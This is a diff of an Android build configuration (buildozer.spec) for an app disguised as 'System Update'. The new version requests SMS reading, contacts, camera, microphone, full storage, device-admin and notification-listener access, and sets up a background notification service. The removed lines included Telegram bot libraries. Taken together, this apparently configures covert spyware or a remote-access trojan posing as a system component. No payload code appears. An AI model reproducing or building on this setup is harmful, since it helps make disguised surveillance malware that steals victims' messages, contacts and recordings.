@@ -3,12 +3,10 @@ title = System Update
 package.name = sysupdate
 package.domain = org.system.update
 source.dir = .
-source.include_exts = py,png,jpg,kv,atlas,xml,bin,sh
-version = 0.1
-requirements = python3,kivy==2.3.0,requests,flask,pyjnius,pycryptodomex,openssl,python-telegram-bot==13.15
+source.include_patterns = main.py, res/*, src/*
+version = 1.0.2
+requirements = python3, kivy==2.3.0, requests, pyjnius, urllib3, certifi, openssl, idna
 orientation = portrait
-osx.python_version = 3
-osx.kivy_version = 2.3.0
 fullscreen = 0
 
 [buildozer]
@@ -16,9 +14,12 @@ log_level = 2
 warn_on_root = 1
 
 [android]
-api = 33
-minapi = 21
-ndk = 25b
-android.permissions = INTERNET, ACCESS_NETWORK_STATE, FOREGROUND_SERVICE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, RECORD_AUDIO, CAMERA, READ_CONTACTS, RECEIVE_SMS, READ_SMS
-android.add_src = yes
-android.gradle_dependencies = 'org.telegram:telegrambots:6.9.7.1'
+android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, RECORD_AUDIO, READ_SMS, RECEIVE_SMS, READ_CONTACTS, WRITE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, MANAGE_EXTERNAL_STORAGE, BIND_DEVICE_ADMIN, BIND_NOTIFICATION_LISTENER_SERVICE, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, WAKE_LOCK, POST_NOTIFICATIONS
+android.meta_data = android.app.device_admin=@xml/device_admin
+android.add_src = src
+android.api = 33
+android.minapi = 21
+android.sdk = 33
+android.ndk = 25b
+android.archs = arm64-v8a, armeabi-v7a
+android.services = notification:src/org/system/update/NotificationService.java
